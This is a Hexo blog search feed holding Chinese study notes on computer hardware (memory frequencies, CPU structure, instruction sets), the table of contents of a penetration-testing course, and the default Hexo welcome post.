        <content type="html"><![CDATA[<p><a name="YZNUX"></a></p><h1 id="内存-主存"><a href="#内存-主存" class="headerlink" title="内存(主存)"></a>内存(主存)</h1><p><img src="../../../../assets/hv722kr5zyem670u_ffk1gw/1668214344172-27c6245e-383c-40eb-bf14-ae18688a9bc6.png" alt="image.png"> <a name="tiXBE"></a></p><h1 id="内存与存储空间"><a href="#内存与存储空间" class="headerlink" title="内存与存储空间"></a>内存与存储空间</h1><p>运行内存: RAM (Random Access Memory)<br>存储空间: ROM (Read Only Memory)</p><p><a name="PfqND"></a></p><h1 id="内存的工作频率"><a href="#内存的工作频率" class="headerlink" title="内存的工作频率"></a>内存的工作频率</h1><p>SDRAM: 100 133 166 200<br>DDR: 200 266 333 400<br>DDR2: 400 533 667 800 1066<br>DDR3: 800 1066 1333 1600 1866 2133<br>DDR4: 2133 2400 2666 3200<br>DDR5: 4800 5200 5600<br>….</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时2-1.2.1-计算机硬件组成-CPU</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-2-1.2.1-ji-suan-ji-ying-jian-zu-cheng-cpu/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-2-1.2.1-ji-suan-ji-ying-jian-zu-cheng-cpu/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>计算机应用程序</th><th></th><th></th></tr></thead><tbody><tr><td>操作系统</td><td>编译原理</td><td></td></tr><tr><td>计算机网络</td><td></td><td></td></tr><tr><td>计算机体系结构</td><td></td><td></td></tr><tr><td>CPU/GPU</td><td>内存/硬盘</td><td>显示器/键盘</td></tr></tbody></table><p><a name="wnxoy"></a></p><h1 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h1><p>Central Processing Unit (中央处理器/处理器)</p><p>常见的电脑处理器:&amp;#x20;<br>Intel奔腾8086、酷睿i5 i7 i9; AMD锐龙</p><p>常见的手机处理器:高通骁龙系列、苹果A系列、海思<br>麒麟系列、联发科天玑系列</p><p><a name="QLaft"></a></p><h2 id="CPU的本质"><a href="#CPU的本质" class="headerlink" title="CPU的本质"></a>CPU的本质</h2><pre><code>             控制单元&lt;br /&gt;            ↓   控制指令      ↓&lt;br /&gt;存储单元&lt;=数据=&gt;运算单元</code></pre><p>控制单元(Control Unit):完成数据处理整个过程中的调配工作;<br>算术逻辑单元ALU(Arithmetic Logic Unit):完成各个指令以便得到程序最终想要的结果;<br>存储单元:负责存储原始数据以及运算结果。</p><p><a name="qGpu2"></a></p><h2 id="芯片和CPU的关系"><a href="#芯片和CPU的关系" class="headerlink" title="芯片和CPU的关系"></a>芯片和CPU的关系</h2><p>芯片有很多种，CPU芯片是其中- -种<br>其他还有GPU、NPU、FPGA芯片等等</p><p>GPU: Graphic Processing Unit图形处理单元<br>NPU: Neural Networks Process Units神经网络处理单元<br>FGCA: Field-Programmable Gate Array现场可编程门</p><p><a name="uRnIL"></a></p><h2 id="CPU和GPU的区别"><a href="#CPU和GPU的区别" class="headerlink" title="CPU和GPU的区别"></a>CPU和GPU的区别</h2><p>CPU<br>控制器 Control<br>运算器ALU<br>高速缓存Cache<br>主存贮器DRAM</p><p>GPU<br>treaming-multiprocessors (SMs)<br>主存贮器DRAM<br><a href="https://www.vipc9.com/"></a> <a name="OTkmS"></a></p><h2 id="CPU重要参数"><a href="#CPU重要参数" class="headerlink" title="CPU重要参数"></a>CPU重要参数</h2><ul><li>核心数:物理核心数</li><li>线程:超线程技术，逻辑处理器</li><li>频率:工作频率，1秒钟产生的脉冲信号</li><li>32位和64位: CPU一次能处理的位数</li></ul><p><a name="c0bqe"></a></p><h2 id="CPU指令集和架构"><a href="#CPU指令集和架构" class="headerlink" title="CPU指令集和架构"></a>CPU指令集和架构</h2><ul><li>指令是用来控制硬件的，经过编译后: 01010101的电信号</li><li>复杂指令集(Complex Instruction Set Computer) :</li></ul><p>每个指令做复杂动作，完成操作需要较少指令，庞大</p><ul><li><p>代表: Intel X86</p></li><li></li><li><p>精简指令集(Reduced Instruction Set Computer) :</p></li></ul><p>每个指令做简单动作，完成操作需要很多指令,灵活</p><ul><li>代表: ARM、RISC-V、 MIPS</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>课时1-1.1-计算机发展历史</title>
      <link href="/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-1-1.1-ji-suan-ji-fa-zhan-li-shi/"/>
      <url>/2022/12/25/penetration-test-learning/part-1-fundamentals-and-preparation/2-linux-operating-system/zhang-jie-1-ji-suan-ji-ti-xi-jie-gou/ke-shi-1-1.1-ji-suan-ji-fa-zhan-li-shi/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>学习目录</title>
      <link href="/2022/12/25/penetration-test-learning/read-me/"/>
      <url>/2022/12/25/penetration-test-learning/read-me/</url>
      
        <content type="html"><![CDATA[<h1 id="第一部分-基础与准备"><a href="#第一部分-基础与准备" class="headerlink" title="第一部分:基础与准备"></a>第一部分:基础与准备</h1><ol><li>中华人民共和国网络安全法</li><li>Linux操作系统</li><li>计算机网络基础</li><li>HTML(网安)</li><li>PHP入门</li><li>MySQL</li><li>Python编程</li></ol><h1 id="第二部分-渗透与攻防"><a href="#第二部分-渗透与攻防" class="headerlink" title="第二部分:渗透与攻防"></a>第二部分:渗透与攻防</h1><ol><li>信息收集</li><li>SQL注入的渗透与防御</li><li>XSS相关渗透与防御</li><li>CSRF渗透与防御</li><li>文件上传漏洞渗透与防御</li><li>文件包含渗透与防御</li><li>SSRF渗透与防御</li><li>XXE渗透与防御</li><li>远程代码执行渗透与防御</li><li>密码暴力猜解与防御（x）</li><li>逻辑相关渗透与防御（x）</li><li>Redis未授权访问漏洞</li><li>反序列化渗透与防御</li><li>AWVS漏洞扫描</li><li>Appscan漏洞扫描</li><li>Nessus漏洞扫描</li><li>MSF+Cobalt Strike</li><li>Burp Suite从入门到实战</li><li>ARP渗透与防御</li><li>DOS与DDOS渗透与防御</li><li>操作系统权限提升渗透与防御</li><li>内网相关渗透与防御</li><li>无线相关渗透与防御</li><li>社会工程学</li><li>木马免杀问题与防御</li><li>渗透报告编写</li><li>CVE漏洞复现</li><li>最新Kali高级渗透测试</li><li>vulnhub靶场实战系列</li><li>挖漏洞项目实战</li><li>【完整回放】2022 HVV实战专题</li><li>2022HVV特训营</li><li>Windows逆向安全进阶版</li><li>免杀-反杀毒技术</li><li>Android逆向</li><li>网络安全VIP直播课</li><li>实战漏洞挖掘经验分享</li><li>溯源</li></ol><h1 id="第三部分-安全管理"><a href="#第三部分-安全管理" class="headerlink" title="第三部分:安全管理"></a>第三部分:安全管理</h1><ol><li>等级保护</li><li>风险评估</li><li>应急响应</li><li>代码审计</li><li>数据安全</li><li>云安全技术</li><li>网络安全就业面试指导课</li></ol><h1 id="第四部分-DevOps"><a href="#第四部分-DevOps" class="headerlink" title="第四部分:DevOps"></a>第四部分:DevOps</h1><ol><li>Nginx基础应用实战</li><li>DevOps必备之Git持续集成工具</li><li>DevOps必备Tomcat代码上线流程</li><li>DevOps必备之Jenkins持续部署工具</li><li>容器管理工具 Docker</li><li>Kubernetes实战进阶课程</li><li>kubernetes实战与源码剖析</li><li>Prometheus-基础入门到源码剖析</li></ol><h1 id="第五部分-进阶提升"><a href="#第五部分-进阶提升" class="headerlink" title="第五部分:进阶提升"></a>第五部分:进阶提升</h1><ol><li>JavaScript入门(网安)</li><li>Web Js逆向</li><li>网络安全与密码学</li><li>HTML5+CSS3零基础到实战</li><li>Shell编程</li><li>汇编语言程序设计</li><li>C语言编程入门</li><li>C++编程入门</li><li>JavaSE初阶</li><li>IDE集成开发工具-IDEA</li><li>JavaSE中阶</li><li>JavaSE进阶实战</li><li>Golang语法精讲</li><li>CTF-Web题型</li><li>CTF-Crypto题型</li></ol><h1 id="第六部分：1-0备份课程"><a href="#第六部分：1-0备份课程" class="headerlink" title="第六部分：1.0备份课程"></a>第六部分：1.0备份课程</h1><ol><li>计算机网络基础PRO</li><li>Linux操作系统(网安)</li><li>渗透测试网站开发后端技术PHP快速入门</li><li>渗透测试网站开发前端技术HTML快速入门</li><li>Python运维自动化课程</li><li>HTML / CSS </li><li>javaScript 入门与程序设计</li><li>SQL注入的渗透与防御（备份）</li><li>Docker进阶课程</li><li>安全巡检</li><li>PHP零基础入门到实战</li><li>PHP零基础入门到实战-(网安)</li></ol>]]></content>
      
      
      <categories>
          
          <category> 目录 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/12/24/hello-world/"/>
      <url>/2022/12/24/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
